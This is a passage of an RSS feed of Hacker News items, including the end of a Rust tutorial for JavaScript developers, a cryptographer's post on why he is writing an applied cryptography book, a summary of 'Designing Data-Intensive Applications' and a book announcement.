<span>let</span> add <span>=</span> <span><span>|</span>a<span>:</span> i32<span>,</span> b<span>:</span> i32<span>|</span></span> <span>-&gt;</span> i32 <span>{</span> a <span>+</span> b <span>}</span><span>;</span>

<span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span><span>;</span> </code></pre>
<p><strong>Multiline:</strong></p>
<pre><code>
<span>let</span> add <span>=</span> <span>(</span>a<span>,</span> b<span>)</span> <span>=</span><span>&gt;</span> <span>{</span>
  <span>let</span> sum <span>=</span> a <span>+</span> b<span>;</span>
  <span>return</span> sum<span>;</span>
<span>}</span><span>;</span>

<span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span><span>;</span> </code></pre>
<pre><code>
<span>let</span> add <span>=</span> <span><span>|</span>a<span>:</span> i32<span>,</span> b<span>:</span> i32<span>|</span></span> <span>-&gt;</span> i32 <span>{</span>
  <span>let</span> sum <span>=</span> a <span>+</span> b<span>;</span>
  <span>return</span> sum<span>;</span>
<span>}</span><span>;</span>

<span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span><span>;</span> </code></pre>
<p>Here’s a cheatsheet:<br><img src="http://www.sheshbabu.com/images/2020-rust-for-javascript-developers-3/image-2.png" alt=""></p>
<p>Closures don’t need the type annotations most of the time, but I’ve added them here for clarity.</p>
<h2 id="If-Else"><a href="#If-Else" title="If Else"></a>If Else</h2><pre><code><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> income <span>=</span> <span>100</span><span>;</span>
  <span>let</span> tax <span>=</span> <span>calculate_tax</span><span>(</span>income<span>)</span><span>;</span>
  <span>println!</span><span>(</span><span>"{}"</span><span>,</span> tax<span>)</span><span>;</span>
<span>}</span>

<span>fn</span> <span>calculate_tax</span><span>(</span>income<span>:</span> i32<span>)</span> <span>-&gt;</span> i32 <span>{</span>
  <span>if</span> income <span>&lt;</span> <span>10</span> <span>{</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span> <span>else</span> <span>if</span> income <span>&gt;=</span> <span>10</span> <span>&amp;&amp;</span> income <span>&lt;</span> <span>50</span> <span>{</span>
    <span>return</span> <span>20</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>50</span><span>;</span>
  <span>}</span>
<span>}</span></code></pre>
<h2 id="Loops"><a href="#Loops" title="Loops"></a>Loops</h2><p>While loops:</p>
<pre><code><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> <span>mut</span> count <span>=</span> <span>0</span><span>;</span>

  <span>while</span> count <span>&lt;</span> <span>10</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> count<span>)</span><span>;</span>
    count <span>+=</span> <span>1</span><span>;</span>
  <span>}</span>
<span>}</span></code></pre>
<p>Normal <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for" target="_blank" rel="noopener">for loops</a> don’t exist in Rust, we need to use <code>while</code> or <code>for..in</code> loops. <code>for..in</code> loops are similar to the <code>for..of</code> loops in JavaScript and they loop over an iterator.</p>
<pre><code><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> numbers <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>;</span>

  <span>for</span> n <span>in</span> numbers<span>.</span><span>iter</span><span>(</span><span>)</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> n<span>)</span><span>;</span>
  <span>}</span>
<span>}</span></code></pre>
<p>Notice that we’re not iterating directly over the array but instead using the <code>iter</code> method of the array.</p>
<p>We can also loop over <a href="https://doc.rust-lang.org/reference/expressions/range-expr.html" target="_blank" rel="noopener">ranges</a>:</p>
<pre><code><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
  <span>for</span> n <span>in</span> <span>1</span><span>..</span><span>5</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> n<span>)</span><span>;</span>
  <span>}</span>
<span>}</span></code></pre>
<h2 id="Iterators"><a href="#Iterators" title="Iterators"></a>Iterators</h2><p>In JavaScript, we can use array methods like map/filter/reduce/etc instead of <code>for</code> loops to perform calculations or transformations on an array.</p>
<p>For example, here we take an array of numbers, double them and filter out the elements that are less than 10:</p>
<pre><code><span>function</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> numbers <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>;</span>

  <span>let</span> double <span>=</span> <span>(</span>n<span>)</span> <span>=</span><span>&gt;</span> n <span>*</span> <span>2</span><span>;</span>
  <span>let</span> less_than_ten <span>=</span> <span>(</span>n<span>)</span> <span>=</span><span>&gt;</span> n <span>&lt;</span> <span>10</span><span>;</span>

  <span>let</span> result <span>=</span> numbers<span>.</span><span>map</span><span>(</span>double<span>)</span><span>.</span><span>filter</span><span>(</span>less_than_ten<span>)</span><span>;</span>

  console<span>.</span><span>log</span><span>(</span>result<span>)</span><span>;</span> 
<span>}</span></code></pre>
<p>In Rust, we can’t directly use map/filter/etc over vectors, we need to follow these steps:</p>
<ol>
<li>Convert the vector into an iterator using <code>iter</code>, <code>into_iter</code> or <code>iter_mut</code> methods</li>
<li>Chain <code>adapters</code> such as map/filter/etc on the iterator</li>
<li>Finally convert the iterator back to a vector using <code>consumers</code> such as <code>collect</code>, <code>find</code>, <code>sum</code> etc</li>
</ol>
<p>Here’s the equivalent Rust code:</p>
<pre><code><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> numbers <span>=</span> <span>vec!</span><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>;</span>

  <span>let</span> double <span>=</span> <span><span>|</span>n<span>:</span> <span>&amp;</span>i32<span>|</span></span> <span>-&gt;</span> i32 <span>{</span> n <span>*</span> <span>2</span> <span>}</span><span>;</span>
  <span>let</span> less_than_10 <span>=</span> <span><span>|</span>n<span>:</span> <span>&amp;</span>i32<span>|</span></span> <span>-&gt;</span> bool <span>{</span> <span>*</span>n <span>&lt;</span> <span>10</span> <span>}</span><span>;</span>

  <span>let</span> result<span>:</span> Vec<span>&lt;</span>i32<span>&gt;</span> <span>=</span> numbers<span>.</span><span>iter</span><span>(</span><span>)</span><span>.</span><span>map</span><span>(</span>double<span>)</span><span>.</span><span>filter</span><span>(</span>less_than_10<span>)</span><span>.</span><span>collect</span><span>(</span><span>)</span><span>;</span>

  <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> result<span>)</span><span>;</span> 
<span>}</span></code></pre>
<p>You should be able to understand most of the code above but you might notice few things off here:</p>
<ul>
<li>The usage of <code>&amp;</code> and <code>*</code> in the closure</li>
<li>The <code>Vec&lt;i32&gt;</code> type annotation for the <code>result</code> variable</li>
</ul>
<p>The <code>&amp;</code> is the reference operator and the <code>*</code> is the dereference operator. The <code>iter</code> method instead of copying the elements in the vector, it passes them as references to the next adapter in the chain. This is why we use <code>&amp;i32</code> in the map’s closure (double). This closure returns <code>i32</code> but <a href="https://doc.rust-lang.org/std/iter/trait.Iterator.html#method.filter" target="_blank" rel="noopener">filter</a> calls its closure (less_than_10) with reference so that’s why we need to use <code>&amp;i32</code> again. To dereference the argument, we use the <code>*</code> operator. We’ll cover this in more detail in future chapters.</p>
<p>Regarding <code>Vec&lt;i32&gt;</code>, so far we haven’t added type annotations to variables as Rust can infer the types automatically, but for <code>collect</code>, we need to be explicitly tell Rust that we expect a <code>Vec&lt;i32&gt;</code> output.</p>
<p>Aside from map and filter, there are ton of other <a href="https://doc.rust-lang.org/std/iter/trait.Iterator.html" target="_blank" rel="noopener">useful adapters</a> that we can use in iterators.</p>
<p>Thanks for reading! Feel free to follow me in <a href="https://twitter.com/sheshbabu" target="_blank" rel="noopener">Twitter</a> for updates :)</p>
</div></div>]]>
            </description>
            <link>http://www.sheshbabu.com/posts/rust-for-javascript-developers-functions-and-control-flow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743363</guid>
            <pubDate>Mon, 06 Jul 2020 00:07:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I’m Writing a Book on Cryptography]]>
            </title>
            <description>
<![CDATA[
Score 171 | Comments 23 (<a href="https://news.ycombinator.com/item?id=23743218">thread link</a>) | @gedigi
<br/>
July 5, 2020 | https://www.cryptologie.net/article/504/why-im-writing-a-book-on-cryptography/ | <a href="https://web.archive.org/web/*/https://www.cryptologie.net/article/504/why-im-writing-a-book-on-cryptography/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>I’ve now been writing a book on <strong>applied cryptography</strong> for a year and a half.
I’m nearing the end of my journey, as I have one last ambitious chapter left to write: next-generation cryptography (a chapter that I’ll use to talk about cryptography that will become more and more practical: post-quantum cryptography, homomorphic encryption, multi-party computation, and zk-SNARKs).</p>
<p>I’ve been asked multiple times <strong>why write a new book about cryptography?</strong> and <strong>why should I read your book?</strong>.
To answer this, you have to understand when it all started…</p>
<h2>Diagrams are everything</h2>
<p>Today if you want to learn about almost anything, you just google it.
Yet, for cryptography, and depending on what you're looking for, resources can be quite lacking.</p>
<p>It all started a long time ago.
For a class, I had to implement a <a href="https://www.paulkocher.com/doc/DifferentialPowerAnalysis.pdf">differential power analysis attack</a>, a breakthrough in cryptanalysis as it was the first side-channel attack to be published.
A differential power analysis uses the power consumption of a device during an encryption to leak its private key.
At the time, I realized that great papers could convey great ideas with very little emphasis on understanding.
I remember banging my head against the wall trying to figure out what the author of the white paper was trying to say.
Worse, I couldn’t find a good resource that explained the paper.
So I banged my head a bit more, and finally I got it.
And then I thought I would help others.
So I drew some diagrams, animated them, and recorded myself going over them.
That was <a href="https://www.youtube.com/watch?v=gbqNCgVcXsM">my first screencast</a>.</p>
<p>This first step in education was enough to make me want to do more.
I started making more of these videos, and started writing more articles about cryptography on this blog (today totaling more than 500 articles).</p>
<p><img alt="we want to know" src="https://www.cryptologie.net/upload/we_want_to_know.png"></p>
<p>I realized early that diagrams were extremely helpful to understand complicated concepts, and that strangely most resources in the field shied away from them.</p>
<p>For example, anyone in cryptography who thinks about AES-CBC would immediately think about the following wikipedia diagram:</p>
<p><img alt="aes cbc" src="https://www.cryptologie.net/upload/600px-CBC_encryption.svg_.png"></p>
<p>So here I was, trying to explain everything I learned, and thinking hard about what sorts of simple diagrams could easily convey these complex ideas.
That’s when I started thinking about a book, years and years before <a href="https://manning.com/">Manning Publications</a> would reach out to me with a book deal.</p>
<h2>The applied cryptographer curriculum</h2>
<p> I hadn’t started cryptography due to a long-life passion.
I had finished a bachelor in theoretical mathematics and didn’t know what was next for me.
I had also been programming my whole life, and I wanted to reconcile the two.
Naturally, I got curious about cryptography, which seemed to have the best of both world, and started reading the different books at my disposal.
I quickly discovered my life's calling.</p>
<p>Some things were annoying me though. In particular, the long introductions that would start with history.
I was only interested in the technicalities, and always had been.
I swore to myself, if I ever wrote a book about cryptography, I would not write a single line on Vigenère ciphers, Caesar ciphers, and others.</p>
<p>And so after applying to the masters of Cryptography at the university of Bordeaux, and obtaining a degree in the subject, I thought I was ready for the world.
Little did I know.
What I thought was a very applied degree actually lacked a lot on the real world protocols I was about to attack.
I had spent a lot of time learning about the mathematics of elliptic curves, but nothing about how they were used in cryptographic algorithms.
I had learned about LFSRs, and ElGamal, and DES, and a series of other cryptographic primitives that I would never see again.</p>
<p>When I started working in the industry at Matasano, which then became NCC Group, my first gig was to audit <a href="https://www.openssl.org/">OpenSSL</a> (the most popular TLS implementation).
Oh boy, did it hurt my brain.
I remember coming back home every day with a strong headache.
What a clusterfuck of a library.
I had no idea at the time that I would years later become a co-author of TLS 1.3.</p>
<p><img alt="sign" src="https://www.cryptologie.net/upload/7._Note_that_digital_signatures_are_specified_with_a_hash_function,_allowing_you_to_.png"></p>
<p>But at that point I was already thinking: this is what I should have learned in school.
The knowledge I’m getting now is what would have been useful to prepare me for the real world.
After all, I was now a security practitioner specialized in cryptography.
I was reviewing real-world cryptographic applications.
I was doing the job that one would wish they had after finishing a cryptography degree.
I implemented, verified, used, and advised on what cryptographic algorithms to use.</p>
<p>This is the reason I’m the first reader of the book I’m writing.
This is what I would have written to my past self in order to prepare me for the real world.</p>
<h2>The use of cryptography is where most of the bugs are</h2>
<p>My consulting job led me to audit many real world cryptographic applications like the <a href="https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2015/may/openssl-audit/">OpenSSL</a>, the <a href="https://www.nccgroup.trust/globalassets/our-research/us/public-reports/2018/final_public_report_ncc_group_google_encryptedbackup_2018-10-10_v1.0.pdf">encrypted backup system of Google</a>, the <a href="https://blog.cloudflare.com/ncc-groups-cryptography-services-audit-of-tls-1-3/">TLS 1.3 implementation of Cloudflare</a>, the <a href="https://letsencrypt.org/2015/04/14/ncc-group-audit.html">certificate authority protocol of Let’s Encrypt</a>, the <a href="https://www.nccgroup.com/us/our-research/zcash-overwinter-consensus-and-sapling-cryptography-review/">sapling protocol of Zcash</a>, the <a href="https://blog.nucypher.com/security-audits--round-1--3/">threshold proxy re-encryption scheme of NuCypher</a> and dozens and dozens of other real-world cryptographic applications that I unfortunately cannot mention publicly.</p>
<p>Early in my job, I was tasked to audit the custom protocol a big corporation (that I can’t name) had written to encrypt their communications.
It turns out that, they were signing everything but the ephemeral keys, which completely broke the whole protocol (as one could have easily replaced the ephemeral keys).
A rookie mistake from anyone with some experience with secure transport protocols, but something that was missed by people who thought they were experienced enough to roll their own crypto.
I remember explaining the vulnerability at the end of the engagement, and a room full of engineers turning silent for a good 30 seconds.</p>
<p>This story repeated itself many times during my career.
There was this time where while auditing a cryptocurrency for another client, I found a way to forge transactions from already existing ones (due to some ambiguity of what was being signed).
Looking at TLS implementations for another client, I found some subtle ways to break an RSA implementation, which in turned transformed into a white paper (with one of the inventor of RSA) leading to a number of <a href="https://eprint.iacr.org/2018/1173">Common Vulnerabilities and Exposures (CVEs) reported to a dozen of open source projects</a>.
More recently, reading about Matrix as part of writing my book, I realized that their authentication protocol was completely broken, <a href="https://matrix.org/security-disclosure-policy/">leading to a complete break of their end-to-end encryption</a>.</p>
<p><img alt="comic" src="https://www.cryptologie.net/upload/HEY_MERE_S_AN.png"></p>
<p>There’s so many details that can unfortunately collapse under you, when making use of cryptography.
At that point, I knew I had to write something about it.
This is why my book contains many of these anecdotes.</p>
<p>As part of the job, I would review cryptography libraries and applications in a multitude of programming languages.
I discovered bugs (for example <a href="https://cryptologie.net/article/347/my-first-cve-o/?utm_content=buffer5c408&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer">CVE-2016-3959</a> in Golang’s standard library), I researched ways that libraries could fool you into misusing them (for example see my paper <a href="https://eprint.iacr.org/2016/644">How to Backdoor Diffie-Hellman</a>), and I advised on what libraries to use.
Developers never knew what library to use, and I always found the answer to be tricky.</p>
<p>I went on to invent the <a href="https://discocrypto.com/">disco protocol</a>, and wrote a fully-featured cryptographic library in less than 1,000 lines of code in several languages.
Disco only relied on two cryptographic primitives: the permutation of SHA-3 and curve25519.
Yes, from only these two things in 1,000 lines of code a developer could do any type of authenticated key exchange, signatures, encryption, MACs, hashing, key derivation, etc.
This gave me a unique perspective as to what a good cryptographic library was supposed to be.</p>
<p>I wanted my book to contain these kind of practical insights.
So naturally, the different chapters contain examples on how to do crypto in different programming languages, using well-respected cryptographic libraries.</p>
<h2>A need for a new book?</h2>
<p>As I was giving <a href="https://www.blackhat.com/us-17/training/beyond-the-beast-a-broad-survey-of-crypto-vulnerabilities.html">one of my annual cryptography training at Black Hat</a>, one student came to me and asked if I could recommend a good book or online course on cryptography.
I remember advising the student to read <a href="http://toc.cryptobook.us/">the book from Boneh &amp; Shoup</a> and <a href="https://crypto.stanford.edu/~dabo/courses/OnlineCrypto/">Cryptography I from Boneh on Coursera</a>.</p>
<p>The student told me “<em>Ah, I tried, it’s too theoretical!</em>”.
This answer stayed with me.
I disagreed at first, but slowly realized that they were right.
Most of these resources were pretty heavy in math, and most developers interacting with cryptography don’t want to deal with math.
 What else was there for them?
The other two somewhat respected resources at the time were Applied Cryptography and Cryptography Engineering (both from Schneier).
But these books were starting to be quite outdated.
Applied Cryptography spent 4 chapters on block ciphers, with a whole chapter on cipher modes of operation but none on authenticated encryption.
Cryptography Engineering had a single mention of elliptic curve cryptography (in a footnote).</p>
<p>On the other hand, many of my videos or blog posts were becoming good primary references for some cryptographic concepts.</p>
<p><strong>I knew I could do something special</strong>.</p>
<p>Gradually, many of my students started becoming interested in cryptocurrencies, asking more and more questions on the subject.
At the same time, I started to audit more and more cryptocurrency applications.
I finally moved to a job at Facebook to work on <a href="https://libra.org/">Libra</a>.
Cryptocurrency was now one of the hottest field to work on, mixing a multitude of extremely interesting cryptographic primitives that so far had seen no real-world use case (zero knowledge proofs, aggregated signatures, threshold cryptography, multi-party computations, consensus protocols, cryptographic accumulators, verifiable random functions, verifiable delay functions, ... the list goes on)</p>
<p><strong>I was now in a unique position</strong>.</p>
<p>I knew I could write something that would tell students, developers, consultants, security engineers, and others, what modern applied cryptography was all about.</p>
<p><img alt="book" src="https://www.cryptologie.net/upload/needs_to_send_a_let.png"></p>
<p>This was going to be a book with very little …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cryptologie.net/article/504/why-im-writing-a-book-on-cryptography/">https://www.cryptologie.net/article/504/why-im-writing-a-book-on-cryptography/</a></em></p>]]>
            </description>
            <link>https://www.cryptologie.net/article/504/why-im-writing-a-book-on-cryptography/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743218</guid>
            <pubDate>Sun, 05 Jul 2020 23:45:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Summary: Designing Data-Intensive Applications by Martin Kleppmann]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23743185">thread link</a>) | @hoanhan101
<br/>
July 5, 2020 | https://hoanhan101.github.io/2020/07/05/design-data-intensive-apps | <a href="https://web.archive.org/web/*/https://hoanhan101.github.io/2020/07/05/design-data-intensive-apps">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"><article role="article"><p>Principles and practicalities of data systems and how to build data-intensive applications.</p><time datetime="2020-07-05T00:00:00-04:00"> July 5, 2020 · 30 mins read · <a href="https://hoanhan101.github.io/category/System-design-notes">System design notes</a><hr> </time><h2 id="i-4-fundamental-ideas-that-we-need-in-order-to-design-data-intensive-applications">I. 4 fundamental ideas that we need in order to design data-intensive applications.</h2><ul><li>Reliable, scalable, maintainable applications.<ul><li>Reliability means continuing to work correctly, even when things go wrong. Common faults and preventions include:<ul><li>Hardware faults: hard disks crash, blackout, incorrect network configuration,…<ul><li>Add redundancy to individual hardware components to reduce the failure rate.</li><li>As long as we can restore a backup onto a new machine quickly, the downtime is not fatal.</li></ul></li><li>Software faults: bug, out of shared resources, unresponsive service, cascading failure,…<ul><li>There’s no quick solution other than thorough testing, measuring, monitoring, analyzing.</li></ul></li><li>Human errors: design error, configuration error,…<ul><li>Enforce good design, good practice and training.</li><li>Decouple the places where people make the most mistake.</li><li>Automate testing: unit test, integration test, end-to-end test.</li><li>Allow quick recovery rollback strategy.</li><li>Set up details monitoring</li></ul></li></ul></li><li>Scalability describes a system’s ability to cope with increased load.<ul><li>Describing load: requests per second, read/write radio, active users, cache hit rate,…</li><li>Describing performance:<ul><li>When you increase a load parameter, keep system resources unchanged, how is performance affected?</li><li>When you increase a load parameter, how much do you increase the resources if you want to keep performance unchanged?</li></ul></li><li>Approaches for coping with load:<ul><li>Scaling up (vertical scaling): move to a more powerful machine.</li><li>Scaling out (horizontal scaling): distribute the load across different machines.</li></ul></li></ul></li><li>Maintainability focuses on 3 design principles:<ul><li>Operability: make it easy for operation teams to keep the system running smoothly.<ul><li>Provide monitoring system health.</li><li>Support for automation and integration tools.</li><li>Have Good documentation.</li></ul></li><li>Simplicity: make it easy for new engineers to understand the system.<ul><li>Provide good abstraction layers that allow us to extract parts of a large system into well-defined, reusable components.</li></ul></li><li>Evolvability: make it easy for engineers to make changes.<ul><li>Follow agile approach.</li></ul></li></ul></li></ul></li><li>Data models and query languages.<ul><li>Data started out being represented as one big tree, though it wasn’t good for representing many-to-many relationships models, so the relational model was invented.</li><li>However, some applications didn’t fit well into the relational model, non-relational NoSQL was born:<ul><li>Document database: self-contained documents, rare relationships between one model and another.</li><li>Graph database: anything is related to everything.</li></ul></li></ul></li><li>Storage and retrieval.<ul><li>Data structres that power your database:<ul><li>Hash indexes:<ul><li>Basically key-value pairs where each key is mapped to a byte offset in the data file.</li><li>Can also split it into smaller chunks/segments for easy storing.</li><li>Even though it’s easy to understand and implement, it has memory constrains that the hash table must fit in memory. Also range queries are not efficient since hashed keys are not put next to each other.</li></ul></li><li>Sorted String Table (SSTable) and Log-Structured Merge-Tree (LSM-trees):<ul><li>SSTable maintains a list of key-value pairs that is sorted by key.</li><li>The table can also be split into smaller segments and merging is simple as it is sorted.</li><li>Maintaining a sorted structure on disk is possible, though keeping it in memory is easy as we can use a tree data structure such as Red-Black trees or AVL trees (memtable).</li><li>If the database crashes, memtable might be lost though we can keep a separate log for it, inspired by LSM-tree indexing structure.</li></ul></li><li>B-trees:<ul><li>Like SSTables, B-trees keep key-value pairs sorted by key, which allows efficient key-value lookups and range queries.</li><li>Instead of breaking down the database into variable-size segments and always writing sequentially, B-trees break into fixed-size blocks/pages and reading/writing one page at a time.</li><li>Every modification is first written to a write-ahead log (WAL) so that the index can be restored to a consistent state after a crash.</li></ul></li></ul></li><li>Transactional processing or analytic?<ul><li>The basic database access pattern is similar to processing business transaction (create, read, update, delete record), as known as online transaction processing (OLTP).</li><li>Since OLTP are expected to be highly available as they’re critical to the operation of the business, they’re reluctant to let business analysts run ad-hoc analytic queries.</li><li>A data warehouse is a separate database that analysts can query without affecting OLTP operations.<ul><li>Data is extracted from OLTP databases, transformed into an analysis-friendly schema, cleaned up, and then loaded into the data warehouse.</li><li>A big advantage of using a separate data warehouse is that the data warehouse can be optimized for analytic access patterns.</li><li>2 popular schemas that data are stored in are star schema, snowflake schema.</li></ul></li></ul></li><li>Column-oriented storage:<ul><li>In most OLTP databases, storage is laid out in a row-oriented fashion: all the values from one row of a table are stored next to each other. In the column-oriented storage, all the values are stored from each column together instead.</li><li>Since the sequences of values for each column are often look repetitive (distinct values are small), they often lend themselves well to compression.</li></ul></li><li>Aggregation:<ul><li>Since data warehouse queries often involve an aggregate function, such as COUNT, SUM, AVG, MIN or MAX, we can cache these aggregated values that are used often.</li><li>One way of creating such a cache is a materialized view, while data cube is a special case.</li></ul></li></ul></li><li>Encoding and evolution.<ul><li>Formats for encoding data.<ul><li>Many languages come with built-in support for encoding in-memory objects to byte sequences though they are not used because it’s language-specific and don’t show good performance.</li><li>JSON, XML are widely known, supported due to the fact that they are simple, can be used by many languages and have built-in support for web browser. However, there are a lot of ambiguity around the encoding of numbers and they also don’t support binary encoding (compact, efficient encoding). Hence the development of MessagePack, BSON, BJSON, and so on.</li><li>Thrift and Protocol Buffers are binary encoding libraries that require a schema for any data that is encoded, that is clearly defined forward and backward compatibility semantics. They come with a code generation tool that produces classes that implement the schema in various programming languages.</li><li>There’s is also a binary encoding library Avro that is good for processing large files as in Hadoop’s use cases.</li></ul></li><li>Modes of data flow (from one process to anther).<ul><li>Databases: the process writing to the database encodes the data, and the process reading from the database decodes it.</li><li>Calls to services, REST and RPC (gRPC): client encodes a request, server decodes the request and encodes a response, and client finally decodes the response.</li><li>Asynchronous message-passing (RabbitMQ, Apache Kafka): nodes send each other messages that are encoded by the sender and decoded by the recipient.</li></ul></li></ul></li></ul><h2 id="ii-replication-partitioningsharding-transactions-and-what-it-means-to-achieve-consistency-and-consensus-in-a-distributed-system">II. Replication, partitioning/sharding, transactions, and what it means to achieve consistency and consensus in a distributed system.</h2><ul><li>Replication.<ul><li>Why would you want to replicate data?<ul><li>Reduce latency by keeping data geographically close to users.</li><li>Increase availability.</li><li>Increase throughput.</li></ul></li><li>2 types of algorithms are leader-based replication and leaderless replication.</li><li>Leader-based replication:<ul><li>Workflow:<ul><li>One of the replicas is designed as the leader while others are followers.</li><li>Client must send write request to the leader though can send read request to both leader and followers.</li><li>After the leader writes data to its local storage, it sends the changes to all of its followers so that they can self apply accordingly.</li></ul></li><li>An important detail of a replicated system is whether the replication happens synchronously or asynchronously.<ul><li>Even though the advantage of synchronous replication is that followers is that the follower is guaranteed to have an up-to-date data, if the synchronous follower doesn’t respond, the write cannot be processed, thus the leader must block all writes and wait until one is available again.</li><li>It is impractical for all followers to be synchronous so leader-based replication is often configured to be completely asynchronous.</li></ul></li><li>From time to time, you need to set up new followers to increase the number of replicas, or to replace failed nodes. This can usually be done without downtime by maintaining a consistent snapshot of the leader’s database.</li><li>If the follower goes down, it can recover quite easily from its logs that it has received from the leader. Later when it’s able to talk to the leader again, it can request all the missing data and catch up to the leader.</li><li>If the leader goes down, a possible approach is failover: one of the followers needs to be promoted to be the new leader using a consensus algorithm, clients and followers need to be configured to talk to the new leader. However, failover can go wrong as well (two leaders, choosing the right timeout before the leader is declared dead,…) as there are no easy solutions to these.</li><li>Different implementation of replication logs:<ul><li>Statement-based replication: the leader logs every write request that it executes, and sends that statement log to its followers. Even though it seems reasonable, non-deterministic function, such as NOW() to get current date and time, is likely to generate a different value on each replica.</li><li>Write-ahead log (WAL) shipping: similar to B-tree’s approach where every modification is first written to a WAL, besides writing the log to disk, the leader also sends it to its followers so that they can build a copy of the exact same data structures as found on the leader.</li><li>Logical log replication: allow the replication log to be decoupled from the storage engine by using different log formats.</li><li>Trigger-based replication: register a trigger to only replicate subset of the data, or from one kind of database to another and so on.</li></ul></li><li>Replication lags:<ul><li>If the user view the data shortly after making the write, new data may have not yet reach the replica. In this case, we need …</li></ul></li></ul></li></ul></li></ul></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hoanhan101.github.io/2020/07/05/design-data-intensive-apps">https://hoanhan101.github.io/2020/07/05/design-data-intensive-apps</a></em></p>]]>
            </description>
            <link>https://hoanhan101.github.io/2020/07/05/design-data-intensive-apps</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743185</guid>
            <pubDate>Sun, 05 Jul 2020 23:40:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Letters to a New Developer, the Book]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23743072">thread link</a>) | @mooreds
<br/>
July 5, 2020 | https://letterstoanewdeveloper.com/the-book/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/the-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-wrapper">
		<div id="content">

	<div id="primary">
		<main id="main" role="main">

			
				
<article id="post-7718" class="page">
			<!-- .entry-header -->
	<div>
		
<p>“Letters To a New Developer” is now a book! Here’s the cover:</p>



<figure><img data-attachment-id="7720" data-permalink="https://letterstoanewdeveloper.com/letters-to-a-new-developer/" data-orig-file="https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png" data-orig-size="827,1181" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="letters-to-a-new-developer" data-image-description="" data-medium-file="https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png?w=210" data-large-file="https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png?w=717" src="https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png?w=717" alt="" srcset="https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png?w=717 717w, https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png?w=105 105w, https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png?w=210 210w, https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png?w=768 768w, https://letterstoanewdeveloper.files.wordpress.com/2020/07/letters-to-a-new-developer.png 827w" sizes="(max-width: 717px) 100vw, 717px"><figcaption>The Cover of Letters to a New Developer</figcaption></figure>



<p>It’s based on this blog, with ideas, text and guest posts drawn from it. The format is similar: letters covering a variety of topics. However, all the content has been thoroughly reviewed, organized and rewritten. You’ll also see new letters covering topics such as why to build a personal board of advisors and discovering your wood lot (trust me, it makes sense when you read it).</p>



<p>The current launch date is <strong>Sep 9, 2020</strong>. You can pre-order it here:</p>



